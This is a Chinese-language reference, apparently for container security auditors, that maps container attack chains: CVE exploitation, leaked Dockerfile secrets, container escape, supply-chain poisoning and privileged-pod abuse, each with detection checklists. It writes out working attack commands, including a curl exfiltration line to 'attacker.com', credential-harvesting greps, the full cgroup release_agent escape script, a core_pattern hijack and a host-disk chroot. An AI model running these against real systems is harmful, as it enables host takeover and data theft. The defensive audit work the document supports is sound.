# 容器镜像攻击模式与利用链参考

本文档整理真实发生过的容器攻击路径，供审计时构建攻击场景。

## 目录
- [攻击链全景图](#攻击链全景图)
- [模式 A：CVE 利用 + 武器库后渗透](#模式-a)
- [模式 B：密钥泄露 → 横向移动](#模式-b)
- [模式 C：容器逃逸 → 宿主机控制](#模式-c)
- [模式 D：供应链植入](#模式-d)
- [模式 E：特权容器滥用](#模式-e)
- [真实 CVE 案例速查](#真实-cve-案例速查)

---

## 攻击链全景图

```
外部访问入口
    │
    ▼
[初始访问]
 CVE RCE / 密钥泄露 / 供应链
    │
    ▼
[容器内站稳脚跟]
 反弹 Shell (nc/python/bash)
 下载工具 (curl/wget)
    │
    ├── [横向移动]
    │    内网扫描 → K8s API → 云元数据 → 其他容器
    │
    ├── [权限提升]
    │    SUID → Capabilities → 内核 CVE
    │
    ├── [持久化]
    │    修改启动脚本 / 写入 crontab
    │
    └── [容器逃逸]
         宿主机文件系统 → 宿主机进程 → 集群控制平面
```

---

## 模式 A：CVE 利用 + 武器库后渗透 {#模式-a}

**典型场景**：Web 应用容器存在 RCE CVE，容器内含有 curl/nc/python 等工具。

```
攻击步骤:
1. 识别目标: 扫描公开服务，发现目标镜像版本信息（通过 HTTP 头/错误页面）
2. 初始访问: 利用已知 RCE CVE（如 Log4Shell CVE-2021-44228）
3. 建立通道: 使用 curl/nc 建立反弹 shell 到 C2 服务器
4. 侦察:     uname -a / env / cat /etc/hosts / mount
5. 凭证收割: grep -r "password\|secret\|key" /app /etc /tmp
6. 横向移动: curl http://169.254.169.254/latest/meta-data/ (云元数据)
             kubectl get secrets --all-namespaces (K8s 集群)
7. 数据外泄: curl -X POST https://attacker.com -d @/data/db_dump.sql
```

**关键 CVE 案例**:
| CVE | 组件 | 类型 | CVSS |
|-----|------|------|------|
| CVE-2021-44228 | Log4j 2 | RCE via JNDI | 10.0 |
| CVE-2022-22965 | Spring Core | RCE | 9.8 |
| CVE-2021-43798 | Grafana | 路径遍历 → 任意文件读 | 9.8 |
| CVE-2022-0543 | Redis | Lua 沙箱逃逸 RCE | 10.0 |
| CVE-2022-24816 | geoserver | RCE | 9.8 |

**检测要点**:
- 应用组件版本是否在已知 RCE CVE 影响范围内？
- 容器内是否存在 curl/wget/nc/python（攻击者的后渗透工具箱）？
- HTTP 响应头是否泄露了版本信息（X-Powered-By、Server）？

---

## 模式 B：密钥泄露 → 横向移动 {#模式-b}

**典型场景**：Dockerfile 中通过 ENV/ARG 设置了 AWS 密钥、数据库密码。

```
攻击步骤:
1. 提取密钥: docker save nginx:latest | tar -xO | strings | grep -E "AWS|secret|key|pass"
             docker history --no-trunc image:tag  (检查层历史)
2. 云服务利用:
   - AWS: aws configure; aws s3 ls; aws iam list-users
   - GCP: gcloud auth activate-service-account --key-file=key.json
   - Azure: az login --service-principal
3. 数据库访问: mysql -h prod-db.internal -u root -p'leaked_password' -e "show databases"
4. API 滥用:  curl -H "Authorization: Bearer leaked_token" https://api.internal/admin
```

**高危配置检测（Trivy DS-0031 / DS-0021）**:
```dockerfile
# ❌ 以下模式均会被 Trivy 检测为密钥泄露
ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
ENV DB_PASSWORD=mysupersecretpassword
ARG GITHUB_TOKEN=ghp_xxxxxxxxxxxx
RUN aws configure set aws_access_key_id $ACCESS_KEY
COPY ./credentials /root/.aws/credentials  # 即使后续删除，层中仍存在！
```

**层历史提取技术**:
```bash
# 提取所有层中的文件（包括被删除的）
docker save target-image | tar -x -O | \
  tar -x --wildcards "*.tar" | \
  find . -name "*.env" -o -name "*.pem" -o -name "*.key"
```

---

## 模式 C：容器逃逸 → 宿主机控制 {#模式-c}

**典型场景**：容器以 root + CAP_SYS_ADMIN 运行，或存在内核 CVE。

### C1：通过 CAP_SYS_ADMIN 逃逸

```bash
# 条件: 容器具有 CAP_SYS_ADMIN
# 步骤:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output  # 宿主机进程列表
```

### C2：通过 runc CVE-2019-5736 逃逸

```
漏洞: runc < 1.0-rc6 文件描述符处理缺陷
影响: 覆盖宿主机 runc 二进制，在容器启动时以 root 执行任意命令
利用: 恶意 Dockerfile 或容器内触发 runc 执行路径
修复: 升级 runc 到 ≥ 1.0-rc6
```

### C3：通过可写 /proc/sys 提权

```bash
# 条件: 容器可写 /proc/sys/kernel/core_pattern
echo "|/tmp/evil_script" > /proc/sys/kernel/core_pattern
# 触发宿主机上的任意程序崩溃即可执行 evil_script
```

**逃逸评估检查表**:
- [ ] `docker inspect` 确认 --privileged 是否设置
- [ ] 检查 Capabilities（危险: SYS_ADMIN, SYS_PTRACE, NET_ADMIN, SYS_MODULE）
- [ ] 确认 /proc、/sys 挂载状态
- [ ] 内核版本是否在 CVE-2022-0492、CVE-2021-22555 影响范围
- [ ] seccomp/AppArmor profile 是否启用

---

## 模式 D：供应链植入 {#模式-d}

**典型场景**：基础镜像或依赖包被恶意替换。

```
攻击向量:
1. 恶意基础镜像: docker pull ubuntu:latest (被 typosquatting 替换)
2. npm 恶意包:   RUN npm install colors@latest (版本污染)
3. PyPI 恶意包:  RUN pip install request (与 requests 近似)
4. go.mod 替换:  replace github.com/legit/pkg => malicious-pkg
5. 构建时注入:   通过 CI/CD 系统的 secrets 泄露
```

**检测方法**:
```bash
# 验证基础镜像摘要
docker images --digests | grep nginx
# 应与官方发布的 SHA256 一致

# 检查 go.sum 完整性
go mod verify

# 运行 govulncheck
govulncheck ./...
```

---

## 模式 E：特权容器滥用 {#模式-e}

**典型场景**：Kubernetes 中的 privileged pod。

```yaml
# 危险配置（实际扫描中检测此类 YAML）
securityContext:
  privileged: true           # 等于宿主机 root
  allowPrivilegeEscalation: true
  capabilities:
    add: ["SYS_ADMIN", "NET_ADMIN"]
  readOnlyRootFilesystem: false  # 可写文件系统
```

**利用 K8s 配置实现逃逸**:
```bash
# 在特权容器内挂载宿主机磁盘
fdisk -l  # 找到宿主机磁盘设备
mkdir /host
mount /dev/sda1 /host
chroot /host  # 进入宿主机环境
```

---

## 真实 CVE 案例速查 {#真实-cve-案例速查}

| CVE | 影响组件 | 攻击类型 | CVSS | PoC 可用 |
|-----|---------|---------|------|---------|
| CVE-2019-5736 | runc < 1.0-rc6 | 容器逃逸 | 8.6 | ✅ |
| CVE-2022-0492 | Linux cgroups | 容器逃逸 | 7.8 | ✅ |
| CVE-2021-30465 | runc | 符号链接竞争 → 路径遍历 | 7.6 | ✅ |
| CVE-2022-23648 | containerd | 镜像层路径遍历 | 7.5 | ✅ |
| CVE-2023-44487 | HTTP/2 | 拒绝服务（Rapid Reset） | 7.5 | ✅ |
| CVE-2023-39325 | Go net/http | HTTP/2 DoS | 7.5 | ✅ |
| CVE-2021-44228 | Log4j 2 | 远程代码执行 | 10.0 | ✅ |
| CVE-2021-43798 | Grafana | 路径遍历任意文件读 | 9.8 | ✅ |
| CVE-2022-1292 | OpenSSL | 命令注入 | 9.8 | ✅ |
| CVE-2022-2068 | OpenSSL | 命令注入 | 9.8 | ✅ |
| CVE-2022-24834 | Redis | Lua 沙箱逃逸 | 8.8 | ✅ |
| CVE-2022-22965 | Spring Framework | RCE | 9.8 | ✅ |
| CVE-2021-41773 | Apache httpd | 路径遍历 RCE | 9.8 | ✅ |
| CVE-2021-42013 | Apache httpd | 路径遍历 RCE | 9.8 | ✅ |
| CVE-2019-14697 | musl libc | 堆溢出 | 9.8 | — |
